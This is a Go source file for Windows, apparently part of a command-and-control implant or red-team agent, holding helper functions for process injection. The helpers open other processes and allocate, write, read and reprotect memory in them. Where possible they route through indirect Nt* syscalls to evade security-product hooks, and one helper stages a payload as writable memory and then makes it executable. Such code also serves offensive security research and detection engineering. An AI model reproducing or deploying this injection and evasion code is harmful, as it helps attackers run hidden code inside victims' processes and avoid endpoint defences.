//go:build windows
// +build windows

// Shared helper functions for process injection commands.
// These auto-dispatch to indirect syscalls (Nt* via stubs) when available,
// falling back to standard Win32 APIs otherwise.

package commands

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procReadProcessMemoryHelper = kernel32.NewProc("ReadProcessMemory")
)

// injectOpenProcess opens a process handle, using indirect syscalls when available.
func injectOpenProcess(desiredAccess uint32, pid uint32) (uintptr, error) {
	if IndirectSyscallsAvailable() {
		var handle uintptr
		status := IndirectNtOpenProcess(&handle, desiredAccess, uintptr(pid))
		if status != 0 {
			return 0, fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
		}
		return handle, nil
	}
	h, err := windows.OpenProcess(desiredAccess, false, pid)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess failed: %v", err)
	}
	return uintptr(h), nil
}

// injectCloseHandle closes a handle, using indirect syscalls when available.
func injectCloseHandle(handle uintptr) {
	if IndirectSyscallsAvailable() {
		IndirectNtClose(handle)
		return
	}
	windows.CloseHandle(windows.Handle(handle))
}

// injectAllocMemory allocates memory in a remote process.
func injectAllocMemory(hProcess uintptr, size int, protect uint32) (uintptr, error) {
	if IndirectSyscallsAvailable() {
		var addr uintptr
		regionSize := uintptr(size)
		status := IndirectNtAllocateVirtualMemory(hProcess, &addr, &regionSize,
			MEM_COMMIT|MEM_RESERVE, protect)
		if status != 0 {
			return 0, fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
		}
		return addr, nil
	}
	addr, _, err := procVirtualAllocEx.Call(hProcess, 0, uintptr(size),
		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(protect))
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	return addr, nil
}

// injectWriteMemory writes data to a remote process.
func injectWriteMemory(hProcess, addr uintptr, data []byte) (int, error) {
	if len(data) == 0 {
		return 0, nil
	}
	if IndirectSyscallsAvailable() {
		var bytesWritten uintptr
		status := IndirectNtWriteVirtualMemory(hProcess, addr,
			uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), &bytesWritten)
		if status != 0 {
			return 0, fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
		}
		return int(bytesWritten), nil
	}
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(hProcess, addr,
		uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)))
	if ret == 0 {
		return 0, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	return int(bytesWritten), nil
}

// injectReadMemory reads data from a remote process into a byte slice.
func injectReadMemory(hProcess, addr uintptr, size int) ([]byte, error) {
	buf := make([]byte, size)
	if IndirectSyscallsAvailable() {
		var bytesRead uintptr
		status := IndirectNtReadVirtualMemory(hProcess, addr,
			uintptr(unsafe.Pointer(&buf[0])), uintptr(size), &bytesRead)
		if status != 0 {
			return nil, fmt.Errorf("NtReadVirtualMemory failed: NTSTATUS 0x%X", status)
		}
		return buf[:bytesRead], nil
	}
	var bytesRead uintptr
	ret, _, err := procReadProcessMemoryHelper.Call(hProcess, addr,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)))
	if ret == 0 {
		return nil, fmt.Errorf("ReadProcessMemory failed: %v", err)
	}
	return buf[:bytesRead], nil
}

// injectReadMemoryInto reads data from a remote process into a caller-provided buffer.
func injectReadMemoryInto(hProcess, addr uintptr, buf unsafe.Pointer, size int) error {
	if IndirectSyscallsAvailable() {
		var bytesRead uintptr
		status := IndirectNtReadVirtualMemory(hProcess, addr,
			uintptr(buf), uintptr(size), &bytesRead)
		if status != 0 {
			return fmt.Errorf("NtReadVirtualMemory failed: NTSTATUS 0x%X", status)
		}
		return nil
	}
	var bytesRead uintptr
	ret, _, err := procReadProcessMemoryHelper.Call(hProcess, addr,
		uintptr(buf), uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)))
	if ret == 0 {
		return fmt.Errorf("ReadProcessMemory failed: %v", err)
	}
	return nil
}

// injectProtectMemory changes memory protection in a remote process.
func injectProtectMemory(hProcess, addr uintptr, size int, protect uint32) (uint32, error) {
	if IndirectSyscallsAvailable() {
		protectAddr := addr
		protectSize := uintptr(size)
		var oldProtect uint32
		status := IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
			protect, &oldProtect)
		if status != 0 {
			return 0, fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
		}
		return oldProtect, nil
	}
	var oldProtect uint32
	ret, _, err := procVirtualProtectX.Call(hProcess, addr, uintptr(size),
		uintptr(protect), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return 0, fmt.Errorf("VirtualProtectEx failed: %v", err)
	}
	return oldProtect, nil
}

// injectAllocWriteProtect is a convenience helper that allocates RW memory,
// writes data, and changes protection to the final value (typically RX).
// This enforces the W^X pattern automatically.
func injectAllocWriteProtect(hProcess uintptr, data []byte, finalProtect uint32) (uintptr, error) {
	addr, err := injectAllocMemory(hProcess, len(data), PAGE_READWRITE)
	if err != nil {
		return 0, err
	}
	_, err = injectWriteMemory(hProcess, addr, data)
	if err != nil {
		return 0, err
	}
	_, err = injectProtectMemory(hProcess, addr, len(data), finalProtect)
	if err != nil {
		return 0, err
	}
	return addr, nil
}
